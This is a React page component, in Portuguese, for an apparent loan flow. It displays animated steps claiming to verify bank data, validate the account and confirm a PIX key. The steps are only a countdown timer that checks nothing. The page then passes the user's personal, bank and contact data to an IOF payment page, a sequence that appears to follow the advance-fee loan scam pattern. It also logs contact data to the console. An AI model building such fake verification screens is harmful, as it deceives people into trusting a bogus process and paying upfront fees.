import { useState, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Loader2, CheckCircle, CreditCard, Circle } from "lucide-react";
import SecurityHeader from "@/components/SecurityHeader";
import SecurityFooter from "@/components/SecurityFooter";

const BankValidationLoading = () => {
  const steps = [
    "Verificando dados bancários...",
    "Validando informações da conta...",
    "Confirmando chave PIX...",
    "Preparando liberação do valor...",
  ];
  const totalSteps = steps.length;
  const [countdown, setCountdown] = useState(8); // 2s por passo
  const currentStep = totalSteps - Math.ceil(countdown / (8 / totalSteps));
  const navigate = useNavigate();
  const location = useLocation();
  const { loanValue, personalData, bankData, contactData } =
    location.state || {};
  console.log("DEBUG BankValidationLoading: contactData", contactData);

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          navigate("/pagamento-iof", {
            state: {
              loanValue,
              personalData,
              bankData,
              contactData,
            },
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [navigate, loanValue, personalData, bankData, contactData]);

  return (
    <div className="min-h-screen bg-gray-light flex flex-col">
      <SecurityHeader />
      <div className="flex-1 flex items-center justify-center min-h-[60vh]">
        <div className="container mx-auto px-4 sm:px-6 lg:px-8">
          <div className="max-w-xl sm:max-w-2xl mx-auto">
            <div className="bg-white rounded-xl sm:rounded-2xl shadow-xl p-6 sm:p-8 text-center space-y-6 sm:space-y-8">
              <div className="space-y-3 sm:space-y-4">
                <div className="w-12 h-12 sm:w-16 sm:h-16 bg-green-primary rounded-full mx-auto flex items-center justify-center">
                  <Loader2 className="w-6 h-6 sm:w-8 sm:h-8 text-white animate-spin" />
                </div>

                <h2 className="text-2xl sm:text-3xl font-bold text-green-dark">
                  Validando dados bancários
                </h2>

                <p className="text-gray-600 text-base sm:text-lg px-2">
                  Preparando a liberação do valor solicitado...
                </p>
              </div>

              <div className="space-y-4 sm:space-y-6">
                <div className="w-full bg-gray-200 rounded-full h-2 sm:h-3">
                  <div
                    className="bg-green-primary h-2 sm:h-3 rounded-full transition-all duration-1000 ease-linear"
                    style={{ width: `${((8 - countdown) / 8) * 100}%` }}
                  ></div>
                </div>

                <div className="text-xs sm:text-sm text-gray-500 space-y-1 mt-4">
                  <div className="flex flex-col items-center gap-1">
                    {steps.map((step, idx) => (
                      <div
                        key={step}
                        className={`flex items-center gap-2 transition-all duration-500 ${
                          idx === currentStep
                            ? "text-green-primary font-semibold scale-105"
                            : idx < currentStep
                            ? "text-green-500"
                            : "text-gray-400 opacity-70"
                        }`}
                      >
                        {idx < currentStep ? (
                          <CheckCircle className="w-4 h-4 animate-pulse" />
                        ) : idx === currentStep ? (
                          <Circle className="w-4 h-4 animate-bounce" />
                        ) : (
                          <Circle className="w-4 h-4" />
                        )}
                        <span>{step}</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <SecurityFooter />
    </div>
  );
};

export default BankValidationLoading;
